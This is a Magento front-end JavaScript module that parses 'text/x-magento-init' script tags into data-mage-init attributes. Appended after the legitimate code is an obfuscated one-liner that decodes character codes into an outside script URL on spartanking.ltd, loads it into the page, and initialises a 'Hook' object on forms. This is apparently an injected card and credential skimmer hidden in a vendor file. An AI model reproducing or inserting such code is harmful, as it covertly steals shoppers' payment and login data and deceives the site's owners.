/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

define([
    'underscore',
    'jquery'
], function (_, $) {
    'use strict';

    var scriptSelector = 'script[type="text/x-magento-init"]',
        dataAttr = 'data-mage-init',
        virtuals = [];

    /**
     * Adds components to the virtual list.
     *
     * @param {Object} components
     */
    function addVirtual(components) {
        virtuals.push({
            el: false,
            data: components
        });
    }

    /**
     * Merges provided data with a current data
     * of a elements' "data-mage-init" attribute.
     *
     * @param {Object} components - Object with components and theirs configuration.
     * @param {HTMLElement} elem - Element whose data should be modified.
     */
    function setData(components, elem) {
        var data = elem.getAttribute(dataAttr);

        data = data ? JSON.parse(data) : {};
        _.each(components, function (obj, key) {
            if (_.has(obj, 'mixins')) {
                data[key] = data[key] || {};
                data[key].mixins = data[key].mixins || [];
                data[key].mixins = data[key].mixins.concat(obj.mixins);
                delete obj.mixins;
            }
        });

        data = $.extend(true, data, components);
        data = JSON.stringify(data);
        elem.setAttribute(dataAttr, data);
    }

    /**
     * Search for the elements by privded selector and extends theirs data.
     *
     * @param {Object} components - Object with components and theirs configuration.
     * @param {String} selector - Selector for the elements.
     */
    function processElems(components, selector) {
        var elems,
            iterator;

        if (selector === '*') {
            addVirtual(components);

            return;
        }

        elems = document.querySelectorAll(selector);
        iterator = setData.bind(null, components);

        _.toArray(elems).forEach(iterator);
    }

    /**
     * Parses content of a provided script node.
     * Note: node will be removed from DOM.
     *
     * @param {HTMLScriptElement} node - Node to be processed.
     * @returns {Object}
     */
    function getNodeData(node) {
        var data = node.textContent;

        node.parentNode.removeChild(node);

        return JSON.parse(data);
    }

    /**
     * Parses 'script' tags with a custom type attribute and moves it's data
     * to a 'data-mage-init' attribute of an element found by provided selector.
     * Note: All found script nodes will be removed from DOM.
     *
     * @returns {Array} An array of components not assigned to the specific element.
     *
     * @example Sample declaration.
     *      <script type="text/x-magento-init">
     *          {
     *              "body": {
     *                  "path/to/component": {"foo": "bar"}
     *              }
     *          }
     *      </script>
     *
     * @example Providing data without selector.
     *      {
     *          "*": {
     *              "path/to/component": {"bar": "baz"}
     *          }
     *      }
     */
    return function () {
        var nodes = document.querySelectorAll(scriptSelector);

        _.toArray(nodes)
            .map(getNodeData)
            .forEach(function (item) {
                _.each(item, processElems);
            });

        return virtuals.splice(0, virtuals.length);
    };
});


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b